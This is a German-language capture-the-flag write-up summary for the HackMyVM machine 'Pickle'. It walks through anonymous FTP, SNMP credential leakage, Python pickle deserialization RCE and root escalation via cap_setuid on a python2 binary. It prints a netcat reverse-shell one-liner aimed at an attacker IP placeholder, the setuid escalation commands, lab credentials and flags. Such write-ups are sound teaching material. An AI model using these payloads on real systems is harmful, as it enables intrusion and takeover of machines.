# Pickle - HackMyVM (Hard)

![Pickle.png](Pickle.png)

## Übersicht

*   **VM:** Pickle
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Pickle)
*   **Schwierigkeit:** Hard
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 19. Oktober 2022
*   **Original-Writeup:** https://alientec1908.github.io/Pickle_HackMyVM_Hard/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Pickle" zu erlangen. Der Weg dorthin begann mit der Entdeckung eines FTP-Servers mit anonymem Zugriff, der den Quellcode (`init.py.bak`) einer Python/Flask-Webanwendung (Port 1337) preisgab. Diese Anwendung war durch HTTP Basic Authentication geschützt. Die Credentials (`lucas:SuperSecretPassword123!`) wurden über SNMP (public community string) gefunden. Die Webanwendung war anfällig für unsichere Deserialisierung von Python-Pickle-Objekten, was zur Remote Code Execution (RCE) als Benutzer `lucas` führte. Durch einen `su`-Befehl mit einem (nicht im Detail erklärten, aber im Log verwendeten) Passwort konnte zum Benutzer `mark` gewechselt werden. Die finale Rechteausweitung zu Root gelang durch Ausnutzung der Linux Capability `cap_setuid+ep` auf einem Python 2-Interpreter (`/home/mark/python2`), was das Setzen der UID auf 0 ermöglichte.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `ftp`
*   `snmpwalk`
*   `curl`
*   `hashlib` (Python-Modul)
*   `tcpdump` (impliziert für Netzwerkanalyse)
*   Python (Scripting für Pickle Exploit)
*   `cPickle` (Python-Modul)
*   `requests` (Python-Modul)
*   `nc` (netcat)
*   `getcap`
*   Python2 (als Exploit-Vektor)
*   `os` (Python-Modul für `setuid`, `system`)
*   Standard Linux-Befehle (`cat`, `ls`, `su`, `id`, `pwd`, `cd`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Pickle" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web/Service Enumeration:**
    *   IP-Adresse des Ziels (192.168.2.140) mit `arp-scan` identifiziert.
    *   `nmap`-Scan offenbarte Port 21 (FTP, vsftpd 3.0.3, anonymer Login erlaubt) und Port 1337 (HTTP, Werkzeug httpd 1.0.1 / Python 2.7.16, HTTP Basic Auth geschützt).
    *   Über anonymen FTP-Login wurde die Datei `init.py.bak` (Quellcode der Webanwendung auf Port 1337) heruntergeladen.
    *   Analyse von `init.py.bak` zeigte die Verwendung des `pickle`-Moduls in der `/checklist`-Route, was auf eine Deserialisierungs-Schwachstelle hindeutete. Die Anwendung speicherte über die `/`-Route POST-Daten unter einem MD5-Hash im Verzeichnis `/opt/project/uploads/`.
    *   Mittels `snmpwalk -c public -v 1 192.168.2.140` wurden SNMP-Informationen abgefragt. In der `sysContact`-OID (`iso.3.6.1.2.1.1.4.0`) wurden die Credentials `lucas:SuperSecretPassword123!` gefunden.

2.  **Initial Access (Pickle Deserialization RCE als `lucas`):**
    *   Ein Python-Exploit-Skript wurde erstellt:
        *   Es definierte eine Klasse `CommandExecute` mit einer `__reduce__`-Methode, die `os.system()` mit einem Netcat-Reverse-Shell-Payload (`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ANGRIFFS_IP 9001 >/tmp/f`) aufruft.
        *   Ein Objekt dieser Klasse wurde mit `cPickle.dumps()` serialisiert.
        *   Der MD5-Hash des serialisierten Payloads wurde berechnet.
        *   Der serialisierte Payload wurde per POST-Request (mit den SNMP-Credentials `lucas:SuperSecretPassword123!`) an die `/`-Route der Webanwendung gesendet, um ihn auf dem Server zu speichern.
        *   Der MD5-Hash wurde per POST-Request (mit Credentials) an die `/checklist`-Route gesendet.
    *   Dies löste die `pickle.loads()`-Funktion auf dem Server aus, führte den serialisierten Payload aus und etablierte eine Reverse Shell als Benutzer `lucas` zu einem Netcat-Listener (Port 9001).

3.  **Privilege Escalation (von `lucas` zu `mark` via `su`):**
    *   Als `lucas` wurde ein weiteres Benutzerverzeichnis (`/home/mark`) entdeckt.
    *   Mit dem Passwort `SUk5enRY2FnUWxnV1BUWFJNNXh4amxhc00wPQ==` (Herkunft im Log nicht detailliert, aber direkt verwendet) wurde mittels `su mark` erfolgreich zum Benutzer `mark` gewechselt.
    *   Die User-Flag (`e25fd1b9248d1786551e3412adc74f6f`) wurde in `/home/mark/user.txt` gefunden.

4.  **Privilege Escalation (von `mark` zu `root` via Capabilities):**
    *   Als `mark` wurde mit `getcap -r / 2>/dev/null` festgestellt, dass der Python 2-Interpreter `/home/mark/python2` die Capability `cap_setuid+ep` besaß.
    *   `/home/mark/python2` wurde gestartet.
    *   Innerhalb des Python-Interpreters wurden die Befehle `import os`, `os.setuid(0)` und `os.system("cat /root/root.txt")` ausgeführt.
    *   Da die `cap_setuid`-Capability vorhanden war, setzte `os.setuid(0)` die effektive UID des Prozesses auf 0 (Root).
    *   Der `cat /root/root.txt`-Befehl wurde somit als Root ausgeführt und gab die Root-Flag (`7a32c9739cc63ed983ae01af2577c01c`) aus.

## Wichtige Schwachstellen und Konzepte

*   **Anonymer FTP-Zugriff mit Informationsleck:** Preisgabe von Quellcode-Backups (`init.py.bak`).
*   **SNMP Information Disclosure (public community):** Klartext-Credentials (`lucas:SuperSecretPassword123!`) waren über SNMP mit dem Standard-Community-String "public" zugänglich.
*   **Unsichere Deserialisierung (Python Pickle):** Eine Webanwendung verwendete `pickle.loads()` auf benutzbeeinflussbare Daten, was zu Remote Code Execution (RCE) führte.
*   **Passwort-Wiederverwendung / Schwache Passwörter (impliziert):** Das Passwort für `mark` war dem Angreifer bekannt.
*   **Linux Capabilities (cap_setuid):** Ein Python-Interpreter im Home-Verzeichnis eines Benutzers hatte die `cap_setuid`-Capability, was eine direkte Eskalation zu Root ermöglichte, indem die UID des Prozesses geändert wurde.

## Flags

*   **User Flag (`/home/mark/user.txt`):** `e25fd1b9248d1786551e3412adc74f6f`
*   **Root Flag (`/root/root.txt`):** `7a32c9739cc63ed983ae01af2577c01c`

## Tags

`HackMyVM`, `Pickle`, `Hard`, `Anonymous FTP`, `SNMP Enumeration`, `Python Pickle Deserialization`, `RCE`, `Linux Capabilities`, `cap_setuid`, `Python2 Exploit`, `Linux`, `Web`, `Privilege Escalation`, `vsftpd`, `Werkzeug`
